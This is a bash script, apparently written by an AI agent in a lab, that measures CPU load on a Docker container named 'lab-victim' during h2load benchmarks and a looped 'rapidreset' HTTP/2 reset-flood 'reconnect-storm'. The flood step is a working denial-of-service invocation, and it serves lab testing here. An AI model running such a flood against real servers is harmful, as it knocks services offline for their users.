#!/usr/bin/env bash
set -u
OUT="/c/Users/kubal/AppData/Local/Temp/claude/5e5918a8413307bf/f6fdd80f-03f5-4b24-af5e-60f3345b4710/scratchpad/calib2.out"
: > "$OUT"
cpu_usec(){ docker exec lab-victim sh -c 'awk "/usage_usec/{print \$2}" /sys/fs/cgroup/cpu.stat' 2>/dev/null; }
meas(){ local a t0 b t1 dt; a=$(cpu_usec); t0=$(date +%s%N); sleep 9; b=$(cpu_usec); t1=$(date +%s%N); dt=$(((t1-t0)/1000)); awk "BEGIN{printf \"%.0f\", ($b-$a)/$dt*100}"; }

# a) h2load c=30
docker exec -d lab-loadgen sh -c 'h2load -c 30 -m 64 -D 16 https://victim/ >/tmp/c.out 2>&1' >/dev/null 2>&1
sleep 3; p=$(meas); echo "h2load c=30 -> CPU=${p}%" | tee -a "$OUT"; sleep 6

# b) h2load c=35
docker exec -d lab-loadgen sh -c 'h2load -c 35 -m 64 -D 16 https://victim/ >/tmp/c.out 2>&1' >/dev/null 2>&1
sleep 3; p=$(meas); echo "h2load c=35 -> CPU=${p}%" | tee -a "$OUT"; sleep 6

# c) bot reconnect-storm 16s
docker exec -d lab-bot sh -c 'end=$(($(date +%s)+16)); while [ $(date +%s) -lt $end ]; do rapidreset -url https://victim:443 -requests 20000 -concurrency 1000 >/dev/null 2>&1; done' >/dev/null 2>&1
sleep 3; p=$(meas); echo "bot reconnect-storm -> CPU=${p}%" | tee -a "$OUT"; sleep 6
echo "# koniec" >> "$OUT"
